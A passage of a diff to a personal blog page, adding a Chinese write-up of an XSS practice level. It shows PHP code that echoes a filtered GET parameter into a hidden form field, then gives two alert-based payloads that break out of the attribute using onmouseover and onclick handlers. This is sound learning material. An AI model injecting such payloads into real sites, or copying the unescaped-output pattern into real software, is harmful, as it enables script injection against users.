+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">源码：</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str11 = $_GET[&quot;t_sort&quot;];</span><br><span class="line">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span><br><span class="line">&lt;form id=search&gt;</span><br><span class="line">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;.$str33.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>开始上难度了 发现我们传进去的东西变成$str33，最后$str33出现在了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;.$str33.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这里补充一下Hidden ：</p>
+<p>Hidden 对象代表一个 HTML 表单中的某个隐藏输入域。</p>
+<p>这种类型的输入元素实际上是隐藏的。这个不可见的表单元素的 value 属性保存了一个要提交给 Web 服务器的任意字符串。如果想要提交并非用户直接输入的数据的话，就是用这种类型的元素。</p>
+<p>onmouseover 事件：</p>
+<p>onmouseover 事件会在鼠标指针移动到指定的元素上时发生。<br>————————————————</p>
+<pre><code>                        版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。
+</code></pre>
+<p>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_54438700/article/details/131723012">https://blog.csdn.net/weixin_54438700/article/details/131723012</a></p>
+</blockquote>
+<p>这里提供两种注入方式</p>
+<p>一、绑定onmouseover 事件，需要注意的是，代码中的type&#x3D;”hidden”，这个属性会隐藏表单，这样我们就找不到要点击的地方了，这里需要我们手动添加type，paylosd：t_sort&#x3D;” onmouseover&#x3D;’alert(“XSS”)’ type&#x3D;”text，这里需要鼠标移过去来触发弹窗。</p>
+<p>二、绑定onclick事件，与前面不同的是，这里需要点击鼠标才会触发弹窗。payload：t_sort&#x3D;” onclick&#x3D;’alert(“XSS”)’ type&#x3D;”text</p>
 
     </div>
 
@@ -320,6 +431,9 @@
                 </a>
             </div>
             <div class="post-nav-item">
+                <a href="/2025/03/11/%E5%85%B4%E8%B6%A3%E6%98%AF%E6%8E%A8%E8%BF%9B%E5%99%A8%EF%BC%8C%E7%9D%A1%E7%9C%A0%E6%98%AF%E7%87%83%E6%96%99/" rel="next" title="兴趣是推进器，睡眠是燃料">
+                  兴趣是推进器，睡眠是燃料 <i class="fa fa-angle-right"></i>
+                </a>
             </div>
           </div>
     </footer>
@@ -352,14 +466,14 @@
       <i class="fa fa-chart-line"></i>
     </span>
       <span>站点总字数：</span>
-    <span title="站点总字数">24k</span>
+    <span title="站点总字数">25k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span>站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">1:25</span>
+    <span title="站点阅读时长">1:32</span>
   </span>
 </div>
 
